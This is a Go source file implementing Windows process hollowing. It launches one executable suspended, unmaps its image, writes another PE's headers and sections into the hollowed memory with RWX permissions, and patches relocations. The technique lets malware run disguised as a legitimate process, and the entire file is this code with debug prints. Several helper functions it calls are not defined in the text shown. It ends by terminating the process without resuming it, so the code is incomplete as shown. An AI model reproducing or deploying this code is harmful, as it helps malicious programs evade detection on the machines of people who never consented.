package main

import (
	"bytes"
	"debug/pe"
	"fmt"
	"io/ioutil"
	"syscall"
	"unsafe"
)

func hollow() {
	procInfo := &syscall.ProcessInformation{}
	startupInfo := &syscall.StartupInfo{}
	if err := createSuspendedProcess("C:\\Users\\Lenovo\\aaa.exe", startupInfo, procInfo); err != nil {
		abort("createProcess", err)
	}

	fmt.Println("created process:", procInfo.ProcessId)

	peb := readRemoteImage(procInfo.Process)
	fmt.Println("remote base address=", peb.imageBaseAddress)

	NtUnmapViewOfSection(procInfo.Process, uintptr(peb.imageBaseAddress))
	fmt.Println("unmapped view of section")

	sourceImageData, err := ioutil.ReadFile("C:\\Users\\Lenovo\\bbb.exe")
	if err != nil {
		abort("read source image data", err)
	}

	breader := bytes.NewReader(sourceImageData)
	sourceImage, err := pe.NewFile(breader)
	if err != nil {
		abort("open src image error:", err)
	}

	sourceOptHeader := sourceImage.OptionalHeader.(*pe.OptionalHeader32)
	fmt.Println("src image base=", sourceOptHeader.ImageBase)

	remoteImageLocation := VirtualAllocEx(procInfo.Process, uintptr(peb.imageBaseAddress), uintptr(sourceOptHeader.SizeOfImage), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	fmt.Println("allocated new remote space=", remoteImageLocation)

	delta := int(peb.imageBaseAddress) - int(sourceOptHeader.ImageBase)

	fmt.Println("relocation delta=", delta)

	sourceOptHeader.ImageBase = uint32(peb.imageBaseAddress)

	WriteProcessMemory(procInfo.Process, uintptr(peb.imageBaseAddress), uintptr(unsafe.Pointer(&sourceImageData[0])), uintptr(sourceOptHeader.SizeOfHeaders), 0)
	fmt.Println("wrote headers from src image to hollowed process")

	for _, section := range sourceImage.Sections {
		sectionDest := uint32(peb.imageBaseAddress) + section.VirtualAddress
		sectionData, err := section.Data()
		if err != nil {
			abort("get section data err=", err)
		}
		if len(sectionData) == 0 {
			continue
		}

		fmt.Println("writing section", section.Name, "to", sectionDest)

		WriteProcessMemory(procInfo.Process, uintptr(sectionDest), uintptr(unsafe.Pointer(&sectionData[0])), uintptr(len(sectionData)), 0)
	}

	if delta > 0 {
		for _, section := range sourceImage.Sections {
			if section.Name != ".reloc" {
				continue
			}
			fmt.Println("rebasing")
			relocSectionData, _ := section.Data()
			relocData := sourceOptHeader.DataDirectory[5]
			offset := uint32(0)
			for offset < relocData.Size {
				blockHeader := (*BaseRelocationBlock)(unsafe.Pointer(&relocSectionData[offset]))
				offset += 8
				entryCount := countRelocationEntries(blockHeader.BlockSize)
				for i := uint32(0); i < entryCount; i++ {
					entry := *(*uint16)(unsafe.Pointer(&relocSectionData[offset]))
					offset += 2
					entryType := entry & 0xF
					if entryType == 0 {
						continue
					}
					entryOffset := entry & 0xFFF
					fieldAddress := blockHeader.PageAddress + uint32(entryOffset)
					var buffer int
					ReadProcessMemory(procInfo.Process, uintptr(peb.imageBaseAddress)+uintptr(fieldAddress), uintptr(unsafe.Pointer(&buffer)), 4, 0)

					buffer += delta

					WriteProcessMemory(procInfo.Process, uintptr(peb.imageBaseAddress)+uintptr(fieldAddress), uintptr(unsafe.Pointer(&buffer)), 4, 0)
				}
			}
			break
		}
	}

	if err := syscall.TerminateProcess(procInfo.Process, 0); err != nil {
		abort("terminateProcess", err)
	}
}

func main() {
	hollow()
}
